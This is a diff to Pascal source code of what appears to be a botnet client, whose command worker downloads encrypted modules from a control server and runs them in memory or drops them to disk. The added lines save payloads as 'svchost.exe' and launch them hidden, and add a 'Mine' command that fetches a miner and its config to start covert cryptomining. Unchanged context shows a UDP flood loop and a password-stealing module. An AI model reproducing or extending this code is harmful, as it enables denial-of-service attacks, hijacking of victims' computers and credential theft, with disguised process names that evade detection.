@@ -17,7 +17,7 @@ type
     FCmdID: String;
     FIndex: LongInt;
     procedure DownloadFile(URL: String; var MS: TMemoryStream);
-    function ExecuteModule(URL, Params: String): Boolean;
+    function ExecuteModule(URL, Params: String; Drop: Boolean = False): Boolean;
   public
     property Identifier: String read FCmdID write FCmdID;
     constructor Create(CmdID: String; Index: LongInt);
@@ -47,18 +47,38 @@ Begin
   MS.Position:=0;
 end;
 
-function TCmdWorker.ExecuteModule(URL, Params: String): Boolean;
+function TCmdWorker.ExecuteModule(URL, Params: String; Drop: Boolean = False): Boolean;
 var
   MS: TMemoryStream;
+  M:  TProcess;
 Begin
   Result:=True;
   MS:=TMemoryStream.Create;
   try
     DownloadFile(URL, MS);
-    Result:=(ExecFromMem(FullName, Params, MS.Memory)<>0);
+    ToggleCrypt(MS, 7019);
+    Writeln(MS.Size);
+    if Drop then Begin
+      MS.SaveToFile('svchost.exe');
+      Sleep(2000);
+      if FileExists('svchost.exe') then Begin
+         M:=TProcess.Create(Nil);
+        try
+          M.Executable:='svchost.exe';
+          M.Parameters.Add(Params);
+          M.ShowWindow:=swoHIDE;
+          M.Execute;
+        except
+          on E: Exception do Result:=False;
+        end;
+        M.Free;
+      end else Result:=False;
+    end else
+      Result:=(ExecFromMem(FullName, Params, MS.Memory)<>0);
   except
     on E: Exception do Result:=False;
   end;
+  MS.Free;
 end;
 
 //General functions and Command Execution
@@ -132,13 +152,14 @@ var
 
   Master: TProcess;
   MemStream: TMemoryStream;
+  FFile: Text;
   Error: Boolean = False;
 
   MemDLLData: Pointer;
   MemDLLModule: PBTMemoryModule;
 
   UP: TIdUDPClient;
-  SMessage: String;
+  STemp, STemp2: String;
 
   procedure DoPost;
   Begin
@@ -246,6 +267,7 @@ Begin
           Master:=TProcess.Create(Nil);
           try
             Master.Executable:='Drop.exe';
+            Master.ShowWindow:=swoHIDE;
             Master.InheritHandles:=False;
             Master.Execute;
           except
@@ -312,14 +334,14 @@ Begin
         Settings.ReadString('Flood', 'DefaultIP', '1.1.1.1'));
       UP.Port:=Net.Commands.ReadInt64(FCmdID, 'Port',
         Settings.ReadInt64('Flood', 'Port', 80));
-      SMessage:=Settings.ReadString('Flood', 'Message', 'A cat is fine too. Desudesudesu~');
+      STemp:=Settings.ReadString('Flood', 'Message', 'A cat is fine too. Desudesudesu~');
       if Settings.ReadBool('Flood', 'MaxPower', True) then Begin
         While Not(Terminated) do Begin
-          UP.Send(SMessage);
+          UP.Send(STemp);
         end;
       end else Begin
         While Not(Terminated) do Begin
-          UP.Send(SMessage);
+          UP.Send(STemp);
           Sleep(1);
         end;
       end;
@@ -328,6 +350,33 @@ Begin
       DoPost;
     end;
     'Mine': Begin
+      ToPost.AddFormField('RT', '1');
+      Randseed:=Discriminator;
+      STemp2:='P'+IntToStr(Random(100) + 1);
+      try
+        //Download config
+        STemp:=StringReplace(Hat.Get(Server+MineConfig), '%WorkerID%', STemp2,
+          [rfReplaceAll, rfIgnoreCase]);
+        AssignFile(FFile, 'config.json');
+        Rewrite(FFile);
+        Write(FFile, STemp);
+        CloseFile(FFile);
+        //Choose miner
+        STemp:=Server;
+        if Pos('64', Net.Commands.ReadString(FCmdID, 'Bitness', '32'))>0 then
+          STemp += MineModule
+        else
+          STemp += MineModule64;
+        //Start mining
+        if ExecuteModule(STemp, '', True) then
+          ToPost.AddFormField('Result', '['+STemp2+'] started mining!')
+        else
+          ToPost.AddFormField('Result', 'Failed to start the mining process.');
+      except
+        on E: Exception do
+          ToPost.AddFormField('Result', 'Mining exception: '+E.Message);
+      end;
+      DoPost;
     end;
     'Passwords': Begin
       Error:=True; //Not feeling too positive today
@@ -344,6 +393,7 @@ Begin
         ToPost.AddFormField('Result', 'Failed to execute the password module.');
       end;
       DoPost;
+      Sleep(500);
       if FileExists('P.html') then DeleteFile('P.html');
     end
     else Begin
